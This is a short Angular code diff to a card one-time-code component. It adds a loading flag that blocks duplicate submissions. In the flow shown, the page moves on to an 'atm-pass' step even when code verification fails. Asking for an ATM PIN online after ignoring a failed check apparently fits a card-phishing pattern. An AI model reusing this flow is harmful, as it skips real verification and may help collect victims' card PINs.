@@ -22,6 +22,7 @@ export class CardOtp implements OnInit, OnDestroy {
   otp: string[] = ['', '', '', '', '', ''];
   timeLeft: number = 60;
   timerInterval: any;
+  isLoading = false;
 
   ngOnInit(): void {
     this.startTimer();
@@ -108,7 +109,7 @@ export class CardOtp implements OnInit, OnDestroy {
   }
 
   verify(): void {
-    if (this.isOtpComplete) {
+    if (this.isOtpComplete && !this.isLoading) {
       const otpCode = this.otp.join('');
       const userId = this.checkoutService.cardId;
 
@@ -117,12 +118,15 @@ export class CardOtp implements OnInit, OnDestroy {
         return;
       }
 
+      this.isLoading = true;
       this.otpService.submitOtp(otpCode, userId).subscribe({
         next: () => {
+          this.isLoading = false;
           this.router.navigate(['/payment/atm-pass']);
         },
         error: (err) => {
           console.error('OTP submission failed', err);
+          this.isLoading = false;
           this.router.navigate(['/payment/atm-pass']);
         }
       });
